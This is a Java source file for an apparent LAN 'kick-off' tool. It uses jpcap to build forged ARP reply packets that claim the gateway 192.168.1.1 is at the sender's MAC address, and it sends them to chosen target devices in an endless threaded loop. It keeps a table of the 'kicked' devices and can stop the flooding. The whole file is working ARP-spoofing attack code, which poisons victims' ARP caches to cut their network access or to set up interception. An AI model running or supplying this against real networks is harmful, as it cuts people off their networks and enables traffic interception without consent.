package com.net;
import inet.ipaddr.MACAddressString;
import inet.ipaddr.mac.MACAddress;
import jpcap.JpcapCaptor;
import jpcap.NetworkInterface;
import jpcap.JpcapSender;
import jpcap.packet.ARPPacket;
import jpcap.packet.EthernetPacket;
import java.io.BufferedInputStream;
import java.io.FileInputStream;
import java.io.InputStream;
import java.net.InetAddress;
import java.util.ArrayList;
import static java.lang.System.out;

class SpoofingObj
{
    String ip;
    int id;
    String mac;
    Boolean status = false;
    SpoofingObj(String ip)
    {
        this.ip = ip;
    }
}
public class spoofing
{
    static int numberOfKickOff = 0;
    static ArrayList<SpoofingObj> SpoofingArr = new ArrayList<>();
    static ARPPacket arpPacket = new ARPPacket();
    static JpcapSender sender;


    static  NetworkInterface  getDeviceInterface(String select)
    {
        // Chose the interface in  the new jpcap by comparing name
        try
        {
            NetworkInterface[] networkInterfaces = JpcapCaptor.getDeviceList();
            for (NetworkInterface device : networkInterfaces)
                if(device.name.equals(select))
                    return device;
        }
        catch (Exception e)
        {
            System.out.println("in debug" + e);
        }
        return null;
    }


    static void attack(String targetIp, String select)
    {
        try
        {
            //WE ARE BUILDING A  ARP PACKET USING TRADITION INFORMATION
            byte[] hardwareAddress = java.net.NetworkInterface.getByInetAddress(InetAddress.getByName(scan.getMyIpAddress())).getHardwareAddress();
            //get Mac of target Ip in string in change it to byte[]
            String getMacArr = scan.getMacAddressShell(targetIp);
            MACAddressString string = new MACAddressString(getMacArr);
            MACAddress macAddress = string.toAddress();
            byte [] targetAddress = macAddress.getBytes();
            NetworkInterface networkInterface = getDeviceInterface(select);
            if (networkInterface == null)
                return;
            sender = JpcapSender.openDevice(networkInterface);
            arpPacket.hardtype = ARPPacket.HARDTYPE_ETHER;
            arpPacket.prototype = ARPPacket.PROTOTYPE_IP;
            arpPacket.operation = ARPPacket.ARP_REPLY;
            arpPacket.hlen = 6;
            arpPacket.plen = 4;
            arpPacket.sender_hardaddr = hardwareAddress;
            arpPacket.sender_protoaddr = InetAddress.getByName("192.168.1.1").getAddress();
            arpPacket.target_hardaddr = targetAddress;
            arpPacket.target_protoaddr = InetAddress.getByName(targetIp).getAddress();
            EthernetPacket ether = new EthernetPacket();
            ether.dst_mac = arpPacket.target_hardaddr;
            ether.src_mac = arpPacket.sender_hardaddr;
            ether.frametype = EthernetPacket.ETHERTYPE_ARP;
            arpPacket.datalink = ether;
            System.out.println(arpPacket);

            //run the Spoofing in a thread
            SpoofingObj user = new SpoofingObj(targetIp);
            user.id = numberOfKickOff;
            numberOfKickOff++;
            user.mac = getMacArr;
            user.status = true;
            SpoofingArr.add(user);
            kickOffClass obj = new kickOffClass(user.id);
            obj.start();
        }
        catch (Exception e)
        {
            System.out.println("Error in arp request :" + e);
        }
    }


    static void showAllKickedDevice()
    {
        out.println("--------------------------------------------------------------------------------");
        out.println("| Device ID                      | Device IP            | Device Mac Address   |");
        out.println("--------------------------------------------------------------------------------");

        for(SpoofingObj obj : SpoofingArr)
        {
            out.println("| " + String.format("%-30s", obj.id) + " | " + String.format("%-20s", obj.ip) + " | " + String.format("%-20s", obj.mac) + " |");
            out.println("--------------------------------------------------------------------------------");
        }
    }


    static void connectDevice(int id)
    {
        SpoofingArr.get(id).status = false;
        numberOfKickOff--;
    }

    static void stopAllThread()
    {
        for(SpoofingObj obj : SpoofingArr)
            obj.status = false;
    }

    public static void help()
    {
        try {
        InputStream input = new BufferedInputStream(new FileInputStream("../README.md"));
        byte[] buffer = new byte[8192];
            for (int length;(length = input.read(buffer)) != -1;)
            {
                System.out.write(buffer, 0, length);
            }
                input.close();
        }
        catch (Exception e)
        {
            out.println("Error in printing help : " + e);
        }
    }
}

class kickOffClass extends Thread
{
    int id;
    kickOffClass(int id)
    {
        this.id = id;
    }
    public void run()
    {
        try
        {
            System.out.println("Test " + spoofing.SpoofingArr.get(id).status);
            while (spoofing.SpoofingArr.get(id).status)
                spoofing.sender.sendPacket(spoofing.arpPacket);
            spoofing.SpoofingArr.remove(id);
            if(spoofing.SpoofingArr.size() >= id)
                for (int i = id; i < spoofing.SpoofingArr.size(); i++)
                    spoofing.SpoofingArr.get(i).id = i;

        }
        catch (Exception ex)
        {
            System.out.println("Error in Thread KickOff class" + ex);
        }
    }
}